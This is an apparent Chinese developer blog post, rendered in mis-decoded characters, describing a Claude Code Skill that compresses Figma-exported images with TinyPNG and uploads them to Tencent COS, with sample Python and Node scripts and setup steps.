ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åˆ‡å›¾ã€å‹ç¼©ã€ä¼  COSã€å¤åˆ¶é“¾æ¥ã€ç²˜å›ä»£ç ã€‚ä¸€ä¸ªé¡µé¢ 5 å¼ å›¾å°±è¦é‡å¤ 5 éã€‚æˆ‘å—å¤Ÿäº†ï¼Œå†™äº†ä¸ª Skill æŠŠè¿™æ´»å„¿äº¤ç»™ AIã€‚</p>
</blockquote>
<h2 data-id="heading-0">èµ·å› ï¼šæ¯å¤©åœ¨ Figma å’Œ COS æ§åˆ¶å°ä¹‹é—´åå¤æ¨ªè·³</h2>
<p>æˆ‘åšå°ç¨‹åºå¼€å‘ï¼Œæ—¥å¸¸è·Ÿè®¾è®¡å¸ˆå¯¹æ¥ã€‚æ¯æ¬¡æ‹¿åˆ° Figma è®¾è®¡ç¨¿ï¼Œå†™ä»£ç ä¹‹å‰å¾—å…ˆå¤„ç†å›¾ç‰‡ï¼š</p>
<ol>
<li>Figma é‡Œä¸€å¼ å¼ åˆ‡å›¾å¯¼å‡º</li>
<li>æ‰“å¼€ TinyPNG ç½‘ç«™ï¼ŒæŠŠ PNG æ‹–è¿›å»å‹ç¼©</li>
<li>ç™»å½•è…¾è®¯äº‘ COS æ§åˆ¶å°ï¼Œä¸Šä¼ </li>
<li>å¤åˆ¶ CDN é“¾æ¥ï¼Œç²˜åˆ°ä»£ç é‡Œ</li>
<li>ä¸‹ä¸€å¼ ï¼Œé‡å¤</li>
</ol>
<p>ä¸€ä¸ªé¡µé¢ 5 å¼ å›¾ï¼Œè¿™å¥—æ“ä½œå°±è¦èµ° 5 éã€‚è¯´å®è¯ï¼Œè¿™æ´»å„¿è°å¹²è°çƒ¦ã€‚</p>
<p>åæ¥æˆ‘å‘ç° Claude Code æœ‰ä¸ª Skill æœºåˆ¶ï¼Œå¯ä»¥æ•™å®ƒæ‰§è¡Œè‡ªå®šä¹‰æµç¨‹ã€‚èŠ±äº†2å°æ—¶æŠ˜è…¾å‡ºæ¥ä¸€ä¸ª <code>image-auto-upload</code> Skillï¼Œç°åœ¨å›¾ç‰‡è¿™å—åŸºæœ¬ä¸ç”¨æˆ‘æ“å¿ƒäº†ã€‚</p>
<h2 data-id="heading-1">æ•ˆæœç›´æ¥çœ‹ä¸‹é¢çš„å›¾ç‰‡</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cac5b5ba7ad64125bdea9a126ef2c70a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgamVycnl3dXM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771227079&amp;x-signature=FBSY4DJmyk3BcPPpj8D0031lsU8%3D" alt="image.png" loading="lazy"/></p>
<p>æˆªå›¾é‡Œèƒ½çœ‹åˆ°æ•´ä¸ªé“¾è·¯ï¼š</p>
<ol>
<li>å·¦ä¸Šè§’æ˜¯ Figma è®¾è®¡ç¨¿</li>
<li>å·¦ä¾§ç»ˆç«¯é‡Œ Claude Code åœ¨è‡ªåŠ¨è¯†åˆ«å›¾ç‰‡ç´ æ</li>
<li>ä¸­é—´æ˜¯tinypngå‹ç¼© + ä¸Šä¼  COS çš„è¿‡ç¨‹</li>
<li>å³ä¸Šè§’ COS æ§åˆ¶å°é‡Œæ–‡ä»¶å·²ç»ä¸Šä¼ æˆæˆåŠŸ</li>
<li>å³ä¸‹è§’æ˜¯å°ç¨‹åºé‡Œçš„æœ€ç»ˆæ•ˆæœ</li>
</ol>
<p>æˆ‘å°±è¾“å…¥äº†ä¸€å¥"æ ¹æ® Figma è®¾è®¡ç¨¿å®ç°è¿™ä¸ªé¡µé¢ï¼ˆè‡ªè¡Œåˆ‡å›¾ä¸Šä¼ æ›¿æ¢ï¼‰"ï¼Œå®ƒè‡ªå·±å…¨åŠäº†ã€‚</p>
<h2 data-id="heading-2">Skill æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿</h2>
<p>ç®€å•è¯´ï¼ŒSkill å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œæ”¾åœ¨ <code>.claude/skills/</code> ä¸‹é¢ï¼Œé‡Œé¢å‘Šè¯‰ Claude æ€ä¹ˆå®ŒæˆæŸä¸ªç‰¹å®šä»»åŠ¡ã€‚</p>
<p>Claude Code æœ¬èº«èƒ½è¯»ä»£ç ã€å†™ä»£ç ã€è·‘å‘½ä»¤ï¼Œä½†å®ƒä¸çŸ¥é“ä½ ä»¬é¡¹ç›®çš„å›¾ç‰‡è¦ä¼ åˆ°å“ªä¸ª COS Bucketï¼Œä¸çŸ¥é“ PNG è¦å…ˆå‹ç¼©ï¼Œä¸çŸ¥é“ä¸Šä¼ è·¯å¾„çš„å‰ç¼€è§„åˆ™ã€‚è¿™äº›"é¡¹ç›®ç§è´§"ï¼Œä½ å¾—è‡ªå·±æ•™å®ƒã€‚Skill å°±æ˜¯å¹²è¿™ä¸ªçš„ã€‚</p>
<p>ç›®å½•ç»“æ„é•¿è¿™æ ·ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">.claude/skills/image-auto-upload/
â”œâ”€â”€ SKILL.md              <span class="hljs-comment"># ç»™ Claude çœ‹çš„æ“ä½œæ‰‹å†Œ</span>
â”œâ”€â”€ README.md             <span class="hljs-comment"># ç»™äººçœ‹çš„ä½¿ç”¨æ–‡æ¡£</span>
â”œâ”€â”€ resources/            <span class="hljs-comment"># æ”¾å¾…ä¸Šä¼ çš„å›¾ç‰‡</span>
â”‚   â””â”€â”€ README.md
â””â”€â”€ scripts/              <span class="hljs-comment"># æ‰§è¡Œè„šæœ¬</span>
    â”œâ”€â”€ upload_images.cjs  <span class="hljs-comment"># Node.js ä¸Šä¼ è„šæœ¬</span>
    â””â”€â”€ compress_png.py    <span class="hljs-comment"># Python å‹ç¼©è„šæœ¬</span>
</code></pre>
<p>æœ€æ ¸å¿ƒçš„æ˜¯ <code>SKILL.md</code>ã€‚Claude è¯»è¿™ä¸ªæ–‡ä»¶æ¥ç†è§£ï¼šä»€ä¹ˆæ—¶å€™è¯¥ç”¨è¿™ä¸ªæŠ€èƒ½ã€å…·ä½“æ€ä¹ˆæ“ä½œã€è°ƒä»€ä¹ˆè„šæœ¬ã€ç»“æœæ€ä¹ˆå±•ç¤ºã€‚</p>
<h2 data-id="heading-3">SKILL.md æ€ä¹ˆå†™</h2>
<p>è¿™ä¸ªæ–‡ä»¶å†™å¾—å¥½ä¸å¥½ï¼Œç›´æ¥å†³å®š Claude èƒ½ä¸èƒ½æ­£ç¡®å¹²æ´»ã€‚æˆ‘æ‹†å¼€è®²è®²ã€‚</p>
<h3 data-id="heading-4">è§¦å‘åœºæ™¯</h3>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## è§¦å‘åœºæ™¯</span>

<span class="hljs-section">### åœºæ™¯ 1ï¼šFigma è®¾è®¡ç¨¿å®ç°</span>
å½“æ ¹æ® Figma è®¾è®¡ç¨¿å®ç°é¡µé¢æ—¶ï¼Œå¦‚æœè®¾è®¡ç¨¿ä¸­åŒ…å«å›¾ç‰‡ç´ æï¼š
<span class="hljs-bullet">1.</span> åˆ—å‡ºå¯ä¸Šä¼ çš„å›¾ç‰‡ç´ æï¼ˆå›¾ç‰‡åç§°ã€ç±»å‹ã€ç”¨é€”ï¼‰
<span class="hljs-bullet">2.</span> ç­‰å¾…ç”¨æˆ·ç¡®è®¤éœ€è¦ä¸Šä¼ å“ªäº›å›¾ç‰‡
<span class="hljs-bullet">3.</span> æ‰§è¡Œä¸Šä¼ å¹¶è¿”å› CDN URL

<span class="hljs-section">### åœºæ™¯ 2ï¼šç›´æ¥ä¸Šä¼ </span>
å½“ç”¨æˆ·ç›´æ¥å‘ŠçŸ¥éœ€è¦ä¸Šä¼ çš„å›¾ç‰‡æˆ–å›¾ç‰‡æ–‡ä»¶å¤¹æ—¶ï¼Œç›´æ¥æ‰§è¡Œä¸Šä¼ æµç¨‹ã€‚
</code></pre>
<p>ä¸¤ç§è§¦å‘æ–¹å¼ã€‚ä¸€ç§æ˜¯å®ç° Figma è®¾è®¡ç¨¿æ—¶ Claude è‡ªå·±å‘ç°æœ‰å›¾ç‰‡ï¼Œä¼šå…ˆé—®ä½ è¦ä¸è¦ä¸Šä¼ ï¼›å¦ä¸€ç§æ˜¯ä½ ç›´æ¥è¯´"ä¸Šä¼ å›¾ç‰‡"ï¼Œå®ƒç«‹åˆ»æ‰§è¡Œã€‚</p>
<p>æˆ‘ä¸€å¼€å§‹åªå†™äº†ç¬¬äºŒç§ï¼Œåæ¥å‘ç°é…åˆ Figma Agent ç”¨çš„æ—¶å€™ï¼ŒClaude ä¸çŸ¥é“è¯¥ä¸»åŠ¨å¤„ç†å›¾ç‰‡ï¼Œè¿˜å¾—æˆ‘æ‰‹åŠ¨æé†’ã€‚åŠ ä¸Šç¬¬ä¸€ç§ä¹‹åå°±é¡ºç•…äº†ã€‚</p>
<h3 data-id="heading-5">å¤„ç†æµç¨‹</h3>
<pre><code class="hljs language-objectivec" lang="objectivec">å°†å›¾ç‰‡æ”¾å…¥ resources/ æ–‡ä»¶å¤¹
      â”‚
      â–¼
  æ˜¯å›¾ç‰‡æ–‡ä»¶ï¼Ÿ(png/jpg/jpeg/webp/gif/svg)
      â”‚
  â”Œâ”€â”€â”€â”´â”€â”€â”€â”
 <span class="hljs-literal">YES</span>     <span class="hljs-literal">NO</span> â†’ è·³è¿‡
  â”‚
  â–¼
  æ˜¯ PNG æ ¼å¼ï¼Ÿ
  â”Œâ”€â”€â”€â”´â”€â”€â”€â”
 <span class="hljs-literal">YES</span>     <span class="hljs-literal">NO</span>
  â”‚       â”‚
  â–¼       â”‚
è‡ªåŠ¨å‹ç¼©   â”‚
  â”‚       â”‚
  â””â”€â”€â”€â”¬â”€â”€â”€â”˜
      â”‚
      â–¼
 ä¸Šä¼ åˆ° Tencent COS
      â”‚
      â–¼
  è¿”å› CDN URL
      â”‚
      â–¼
 è‡ªåŠ¨æ¸…ç†æºæ–‡ä»¶
</code></pre>
<p>å‡ ä¸ªè®¾è®¡ä¸Šçš„è€ƒè™‘ï¼š</p>
<ul>
<li>PNG å…ˆè¿‡ TinyPNG API å‹ç¼©å†ä¼ ï¼ŒJPG/WebP ç›´æ¥ä¼ ã€‚PNG å‹ç¼©ç‡ä¸€èˆ¬åœ¨ 60%-80%ï¼Œçœçš„æµé‡è¿˜æ˜¯æŒºå¯è§‚çš„</li>
<li><code>.DS_Store</code> ä¹‹ç±»çš„æ‚æ–‡ä»¶è‡ªåŠ¨è·³è¿‡ï¼Œä¸ç”¨æ‰‹åŠ¨æ¸…ç†</li>
<li>ä¼ å®Œè‡ªåŠ¨åˆ æºæ–‡ä»¶ã€‚ä¸€å¼€å§‹æˆ‘æ²¡åŠ è¿™ä¸ªï¼Œresources ç›®å½•è¶Šæ¥è¶Šå¤§ï¼Œåæ¥åŠ äº†è‡ªåŠ¨æ¸…ç†</li>
</ul>
<h3 data-id="heading-6">è¾“å‡ºæ ¼å¼</h3>
<pre><code class="hljs language-markdown" lang="markdown">| å›¾ç‰‡åç§° | CDN URL |
|----------|---------|
| icon.png | https://xxx.cos.ap-nanjing.myqcloud.com/applet/icon.png |
| bg.jpg   | https://xxx.cos.ap-nanjing.myqcloud.com/applet/bg.jpg |
</code></pre>
<p>ä¸Šä¼ å®Œç”¨è¡¨æ ¼å±•ç¤ºç»“æœï¼Œæ–¹ä¾¿ç›´æ¥å¤åˆ¶ URLã€‚</p>
<h2 data-id="heading-7">ä¸¤ä¸ªè„šæœ¬ï¼Œä¸€ä¸ªå‹ç¼©ä¸€ä¸ªä¼ </h2>
<p>æ•´ä¸ª Skill é ä¸¤ä¸ªè„šæœ¬å¹²æ´»ã€‚</p>
<h3 data-id="heading-8">PNG å‹ç¼©ï¼ˆcompress_png.pyï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> tinify

<span class="hljs-keyword">def</span> <span class="hljs-title function_">compress_image</span>(<span class="hljs-params">input_path, output_path=<span class="hljs-literal">None</span></span>):
    tinify.key = TINYPNG_API_KEY  <span class="hljs-comment"># ä» .env.skills è¯»å–</span>

    input_size = input_file.stat().st_size
    source = tinify.from_file(<span class="hljs-built_in">str</span>(input_file))
    source.to_file(<span class="hljs-built_in">str</span>(output_path))  <span class="hljs-comment"># å‹ç¼©åè¦†ç›–åŸæ–‡ä»¶</span>
    output_size = output_path.stat().st_size

    compression_ratio = <span class="hljs-built_in">round</span>((<span class="hljs-number">1</span> - output_size / input_size) * <span class="hljs-number">100</span>, <span class="hljs-number">2</span>)
    <span class="hljs-keyword">return</span> { <span class="hljs-string">"compression_ratio"</span>: compression_ratio }
</code></pre>
<p>é€»è¾‘å¾ˆç›´ç™½ï¼šè¯»æ–‡ä»¶ã€è°ƒ TinyPNG APIã€å†™å›å»è¦†ç›–åŸæ–‡ä»¶ã€‚TinyPNG å…è´¹é¢åº¦æ¯æœˆ 500 æ¬¡ï¼Œä¸ªäººé¡¹ç›®å®Œå…¨å¤Ÿç”¨ã€‚</p>
<h3 data-id="heading-9">COS ä¸Šä¼ ï¼ˆupload_images.cjsï¼‰</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">COS</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'cos-nodejs-sdk-v5'</span>);

<span class="hljs-comment">// ä¸Šä¼ å•ä¸ªæ–‡ä»¶ï¼ˆåˆ†ç‰‡ä¸Šä¼ ï¼‰</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">uploadFile</span>(<span class="hljs-params">filePath, key</span>) {
  <span class="hljs-comment">// 1. åˆå§‹åŒ–åˆ†ç‰‡ä¸Šä¼ </span>
  cos.<span class="hljs-title function_">multipartInit</span>({ <span class="hljs-title class_">Bucket</span>, <span class="hljs-title class_">Region</span>, <span class="hljs-title class_">Key</span> }, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
    <span class="hljs-comment">// 2. ä¸Šä¼ åˆ†ç‰‡</span>
    cos.<span class="hljs-title function_">multipartUpload</span>({ ... <span class="hljs-title class_">Body</span>: fs.<span class="hljs-title function_">createReadStream</span>(filePath) }, <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// 3. å®Œæˆä¸Šä¼ </span>
      cos.<span class="hljs-title function_">multipartComplete</span>({ ... });
    });
  });
}

<span class="hljs-comment">// ä¸Šä¼ æ•´ä¸ªæ–‡ä»¶å¤¹ï¼ˆé€’å½’å­ç›®å½•ï¼‰</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">uploadFolder</span>(<span class="hljs-params">folderPath, prefix</span>) {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> file <span class="hljs-keyword">of</span> files) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isImageFile</span>(file)) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// è·³è¿‡éå›¾ç‰‡</span>
    <span class="hljs-title function_">compressPng</span>(file);                  <span class="hljs-comment">// PNG å…ˆå‹ç¼©</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">uploadFile</span>(file, key);        <span class="hljs-comment">// ä¼ åˆ° COS</span>
    fs.<span class="hljs-title function_">unlinkSync</span>(file);               <span class="hljs-comment">// åˆ æºæ–‡ä»¶</span>
  }
}
</code></pre>
<p>ç”¨äº† COS SDK çš„åˆ†ç‰‡ä¸Šä¼ ï¼Œæ”¯æŒé€’å½’å­ç›®å½•ã€‚ä¸Šä¼ æˆåŠŸåˆ æºæ–‡ä»¶ï¼Œå¤±è´¥çš„ç•™ç€æ–¹ä¾¿é‡è¯•ã€‚</p>
<h3 data-id="heading-10">å¯†é’¥æ”¾å“ª</h3>
<p>COS å¯†é’¥å’Œ TinyPNG API Key æ”¾åœ¨é¡¹ç›®æ ¹ç›®å½•çš„ <code>.env.skills</code> é‡Œï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># .env.skillsï¼ˆè®°å¾—åŠ  .gitignoreï¼‰</span>
COS_BUCKET=your-bucket-name
COS_REGION=ap-nanjing
COS_UPLOAD_PREFIX=applet
TINYPNG_API_KEY=your-tinypng-api-key
</code></pre>
<p>è¿™ä¸ªæ–‡ä»¶ä¸è¿› Gitï¼Œå¯†é’¥ä¸ä¼šæ³„éœ²ã€‚</p>
<h2 data-id="heading-11">å®é™…ç”¨èµ·æ¥æ˜¯ä»€ä¹ˆæ„Ÿè§‰</h2>
<h3 data-id="heading-12">é…åˆ Figma ç”¨ï¼ˆæˆ‘æœ€å¸¸ç”¨çš„æ–¹å¼ï¼‰</h3>
<p>æˆ‘é¡¹ç›®é‡Œè¿˜æœ‰ä¸ª <code>figma-designer</code> Agentï¼Œé…ç½®é‡Œå†™äº†ä¸€æ¡ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">é‡åˆ°å›¾ç‰‡ï¼Œå…ˆè‡ªåŠ¨åˆ‡åˆ°æœ¬åœ°ï¼Œç„¶åè°ƒç”¨ skills è¿›è¡Œå‹ç¼©ä¸Šä¼  COSï¼Œç„¶åæ›¿æ¢ä»£ç 
</code></pre>
<p>æ‰€ä»¥æµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p>
<ol>
<li>æˆ‘åœ¨ Figma é‡Œé€‰ä¸­è¦å®ç°çš„é¡µé¢</li>
<li>åœ¨ Claude Code é‡Œè¯´"æ ¹æ® Figma è®¾è®¡ç¨¿å®ç°è¿™ä¸ªé¡µé¢"</li>
<li>Claude é€šè¿‡ Figma MCP è¯»è®¾è®¡ç¨¿ï¼Œè¯†åˆ«å‡ºå›¾ç‰‡ç´ æ</li>
<li>è‡ªåŠ¨å¯¼å‡ºå›¾ç‰‡ â†’ å‹ç¼© PNG â†’ ä¼  COS â†’ æ‹¿åˆ° CDN URL</li>
<li>ç”¨ URL æ›¿æ¢ä»£ç é‡Œçš„å›¾ç‰‡å¼•ç”¨ï¼Œç”Ÿæˆ Vue ç»„ä»¶</li>
</ol>
<p>æˆ‘åªç®¡æœ€åçœ‹ä¸€çœ¼ä»£ç å¯¹ä¸å¯¹ã€‚ä¸­é—´å›¾ç‰‡é‚£ä¸€å †äº‹ï¼Œå®Œå…¨ä¸ç”¨ç®¡ã€‚</p>
<p>è¯´å®è¯ç¬¬ä¸€æ¬¡è·‘é€šçš„æ—¶å€™è¿˜æŒºæ„å¤–çš„ï¼Œæ²¡æƒ³åˆ°å‡ ä¸ªå·¥å…·ä¸²èµ·æ¥èƒ½è¿™ä¹ˆé¡ºã€‚</p>
<h3 data-id="heading-13">æ‰‹åŠ¨ä¼ å‡ å¼ å›¾</h3>
<p>æœ‰æ—¶å€™è®¾è®¡å¸ˆå•ç‹¬ä¸¢å‡ å¼ å›¾è¿‡æ¥ï¼Œä¸èµ° Figma æµç¨‹ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">æˆ‘ï¼šå¸®æˆ‘ä¸Šä¼  resources é‡Œçš„å›¾ç‰‡

Claudeï¼šå‘ç° resources ç›®å½•ä¸‹æœ‰ <span class="hljs-number">3</span> å¼ å›¾ç‰‡ï¼š
- banner<span class="hljs-selector-class">.png</span> (PNGï¼Œå°†è‡ªåŠ¨å‹ç¼©)
- <span class="hljs-attribute">icon</span>-success<span class="hljs-selector-class">.png</span> (PNGï¼Œå°†è‡ªåŠ¨å‹ç¼©)
- photo<span class="hljs-selector-class">.jpg</span> (JPGï¼Œç›´æ¥ä¸Šä¼ )

æ­£åœ¨å¤„ç†...

<span class="hljs-selector-attr">[banner.png]</span> æ­£åœ¨å‹ç¼© PNG... å‹ç¼©å®Œæˆ (<span class="hljs-number">72%</span> reduction)
<span class="hljs-selector-attr">[banner.png]</span> ä¸Šä¼ å®Œæˆ
<span class="hljs-selector-attr">[icon-success.png]</span> æ­£åœ¨å‹ç¼© PNG... å‹ç¼©å®Œæˆ (<span class="hljs-number">65%</span> reduction)
<span class="hljs-selector-attr">[icon-success.png]</span> ä¸Šä¼ å®Œæˆ
<span class="hljs-selector-attr">[photo.jpg]</span> ä¸Šä¼ å®Œæˆ

========== ä¸Šä¼ å®Œæˆ ==========
æˆåŠŸ: <span class="hljs-number">3</span> ä¸ªæ–‡ä»¶
å¤±è´¥: <span class="hljs-number">0</span> ä¸ªæ–‡ä»¶

| å›¾ç‰‡åç§° | CDN URL |
|----------|---------|
| banner.png | https://xxx.cos.../applet/banner.png |
| icon-success.png | https://xxx.cos.../applet/icon-success.png |
| photo.jpg | https://xxx.cos.../applet/photo.jpg |

æºæ–‡ä»¶å·²è‡ªåŠ¨æ¸…ç†ã€‚
</code></pre>
<h3 data-id="heading-14">æ‰¹é‡ä¼ ä¸€æ•´å¥—å›¾</h3>
<p>æ¯”å¦‚ä¸€æ¬¡æ€§ä¼ ä¸€å¥—å›¾æ ‡ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">resources/
â”œâ”€â”€ icons/
â”‚   â”œâ”€â”€ home.png
â”‚   â”œâ”€â”€ cart.png
â”‚   â””â”€â”€ user.png
â””â”€â”€ backgrounds/
    â”œâ”€â”€ login-bg.jpg
    â””â”€â”€ main-bg.jpg
</code></pre>
<p>ä¸Šä¼ åç›®å½•ç»“æ„åŸæ ·ä¿ç•™ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">applet/icons/home.png
applet/icons/cart.png
applet/icons/user.png
applet/backgrounds/login-bg.jpg
applet/backgrounds/main-bg.jpg
</code></pre>
<p>è¿™ä¸ªæˆ‘è¸©è¿‡å‘ã€‚ä¸€å¼€å§‹ä¸Šä¼ è„šæœ¬ä¸æ”¯æŒå­ç›®å½•ï¼Œæ‰€æœ‰æ–‡ä»¶éƒ½å¹³é“ºåˆ°æ ¹è·¯å¾„ä¸‹ï¼Œæ–‡ä»¶åä¸€å†²çªå°±è¦†ç›–äº†ã€‚åæ¥åŠ äº†é€’å½’ç›®å½•æ”¯æŒæ‰è§£å†³ã€‚</p>
<h2 data-id="heading-15">æƒ³è‡ªå·±æä¸€ä¸ªï¼Ÿç…§ç€æ¥</h2>
<h3 data-id="heading-16">1. å»ºç›®å½•</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">mkdir</span> -p .claude/skills/image-auto-upload/{scripts,resources}
</code></pre>
<h3 data-id="heading-17">2. è£…ä¾èµ–</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># PNG å‹ç¼©</span>
pip install tinify

<span class="hljs-comment"># COS ä¸Šä¼ </span>
npm install cos-nodejs-sdk-v5
</code></pre>
<h3 data-id="heading-18">3. é…ç¯å¢ƒå˜é‡</h3>
<p>é¡¹ç›®æ ¹ç›®å½•å»º <code>.env.skills</code>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">COS_BUCKET=your-bucket-name
COS_REGION=ap-nanjing
COS_UPLOAD_PREFIX=your-prefix
TINYPNG_API_KEY=your-tinypng-api-key
</code></pre>
<p>TinyPNG API Key å» <a href="https://link.juejin.cn?target=https%3A%2F%2Ftinypng.com%2Fdevelopers" target="_blank" title="https://tinypng.com/developers" ref="nofollow noopener noreferrer">tinypng.com/developers</a> ç”³è¯·ï¼Œå…è´¹çš„ï¼Œæ¯æœˆ 500 æ¬¡é¢åº¦ã€‚</p>
<h3 data-id="heading-19">4. å†™ SKILL.md</h3>
<p>è¿™æ­¥æœ€èŠ±æ—¶é—´ï¼Œä¹Ÿæœ€å€¼å¾—èŠ±æ—¶é—´ã€‚å‡ ä¸ªç»éªŒï¼š</p>
<ol>
<li>è§¦å‘åœºæ™¯å†™æ¸…æ¥šï¼Œä¸ç„¶ Claude ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™è¯¥ç”¨</li>
<li>æµç¨‹ç”¨æµç¨‹å›¾æˆ–æ­¥éª¤åˆ—è¡¨ï¼Œåˆ«å†™å¤§æ®µæ–‡å­—</li>
<li>å‘½ä»¤ç»™å®Œæ•´çš„ï¼Œèƒ½ç›´æ¥å¤åˆ¶æ‰§è¡Œçš„é‚£ç§</li>
<li>å®šä¹‰å¥½è¾“å‡ºæ ¼å¼ï¼Œä¸ç„¶æ¯æ¬¡è¿”å›çš„ç»“æœæ ¼å¼éƒ½ä¸ä¸€æ ·</li>
</ol>
<p>æˆ‘ç¬¬ä¸€ç‰ˆ SKILL.md å†™å¾—å¤ªç®€ç•¥ï¼ŒClaude ç»å¸¸æ¼æ­¥éª¤ã€‚åæ¥è¡¥äº†æµç¨‹å›¾å’Œå…·ä½“å‘½ä»¤ï¼Œå°±ç¨³å®šå¤šäº†ã€‚</p>
<h3 data-id="heading-20">5. åŠ  .gitignore</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">".env.skills"</span> &gt;&gt; .gitignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">".claude/skills/image-auto-upload/resources/*"</span> &gt;&gt; .gitignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">"!.claude/skills/image-auto-upload/resources/README.md"</span> &gt;&gt; .gitignore
</code></pre>
<h2 data-id="heading-21">åˆ°åº•çœäº†å¤šå°‘äº‹</h2>
<p>åˆ—ä¸ªå¯¹æ¯”å§ï¼š</p>








































<table><thead><tr><th>æ“ä½œ</th><th>æ‰‹åŠ¨</th><th>ç”¨ Skill</th></tr></thead><tbody><tr><td>åˆ‡å›¾å¯¼å‡º</td><td>ä¸€å¼ å¼ ä» Figma å¯¼å‡º</td><td>è‡ªåŠ¨è¯†åˆ«å¯¼å‡º</td></tr><tr><td>PNG å‹ç¼©</td><td>å¼€ TinyPNG ç½‘ç«™æ‹–æ‹½</td><td>è‡ªåŠ¨è°ƒ API</td></tr><tr><td>ä¸Šä¼  COS</td><td>ç™»æ§åˆ¶å°æ‰‹åŠ¨ä¼ </td><td>è„šæœ¬è‡ªåŠ¨ä¼ </td></tr><tr><td>å¤åˆ¶é“¾æ¥</td><td>ä¸€ä¸ªä¸ªå¤åˆ¶ URL</td><td>è¡¨æ ¼ç›´æ¥ç»™</td></tr><tr><td>æ›¿æ¢ä»£ç </td><td>æ‰‹åŠ¨ç²˜è´´</td><td>è‡ªåŠ¨æ›¿æ¢</td></tr><tr><td>5 å¼ å›¾è€—æ—¶</td><td>å¤§æ¦‚ 10 åˆ†é’Ÿ</td><td>30 ç§’å·¦å³</td></tr></tbody></table>
<p>ä»£ç é‡ä¹Ÿä¸å¤§ï¼ŒPython è„šæœ¬ 136 è¡Œï¼ŒNode.js è„šæœ¬ 290 è¡Œã€‚å†™ SKILL.md åè€ŒèŠ±çš„æ—¶é—´æ›´å¤šï¼Œå› ä¸ºè¦åå¤è°ƒè¯• Claude çš„ç†è§£æ˜¯å¦å‡†ç¡®ã€‚</p>
<p>è¯´åˆ°åº•ï¼ŒSkill å°±æ˜¯æŠŠä½ è„‘å­é‡Œ"è¿™ä¸ªé¡¹ç›®å›¾ç‰‡è¯¥æ€ä¹ˆå¤„ç†"çš„ç»éªŒï¼Œå†™æˆ Claude èƒ½çœ‹æ‡‚çš„æ–‡æ¡£ã€‚æ•™ä¸€æ¬¡ï¼Œåé¢å°±ä¸ç”¨å†æ“å¿ƒäº†ã€‚</p>
<p>å¦‚æœä½ é¡¹ç›®é‡Œä¹Ÿæœ‰ç±»ä¼¼çš„é‡å¤æ“ä½œï¼Œå¯ä»¥è¯•è¯•å†™ä¸ª Skillã€‚ä¸ä¸€å®šæ˜¯å›¾ç‰‡ä¸Šä¼ ï¼Œä»»ä½•æœ‰å›ºå®šæµç¨‹çš„äº‹æƒ…éƒ½è¡Œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring æºç åˆ†æ å•ä¾‹ Bean çš„åˆ›å»ºè¿‡ç¨‹]]></title>    <link>https://juejin.cn/post/7604315965875060770</link>    <guid>https://juejin.cn/post/7604315965875060770</guid>    <pubDate>2026-02-09T07:48:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604315965875060770" 